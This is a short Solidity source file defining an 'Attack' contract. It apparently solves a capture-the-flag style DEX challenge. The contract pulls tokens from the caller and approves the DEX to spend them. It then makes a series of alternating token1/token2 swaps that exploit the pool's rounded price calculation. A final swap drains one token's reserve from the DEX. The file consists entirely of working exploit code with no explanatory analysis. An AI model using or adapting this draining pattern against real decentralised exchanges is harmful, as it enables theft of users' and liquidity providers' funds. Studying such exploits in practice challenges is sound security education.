// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex{
  function swap(address, address, uint)external;
}
interface ISwappableToken{
  function balanceOf(address)external view returns(uint256);
  function approve(address, address, uint256)external;
  function approve(address, uint256)external;
  function transferFrom(address, address, uint256)external;
}
contract Attack{

   ISwappableToken token1;
   ISwappableToken token2;
   
   bool success= true;
    constructor(ISwappableToken _token1, ISwappableToken _token2){
        token1= _token1;
        token2= _token2;
    }
    function attack(IDex dex)external{
        // Approve transfer of tokens to the attacker's address
        token1.approve(msg.sender, address(this), 10);
        token1.transferFrom(msg.sender, address(this), 10);

        token2.approve(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender,address(this),10);

        // Approve transfer of tokens to the Dex contract
        token1.approve(address(dex),110);
        token2.approve(address(dex),110);

        // Perform multiple swaps between token1 and token2
        dex.swap(address(token1),address(token2),token1.balanceOf(address(this)));
        dex.swap(address(token2),address(token1),token2.balanceOf(address(this)));
        dex.swap(address(token1),address(token2),token1.balanceOf(address(this)));
        dex.swap(address(token2),address(token1),token2.balanceOf(address(this)));
        dex.swap(address(token1),address(token2),token1.balanceOf(address(this)));

        // Final swap to transfer remaining token balance from Dex to attacker
        dex.swap(address(token2),address(token1),token2.balanceOf(address(dex)));
    }
}
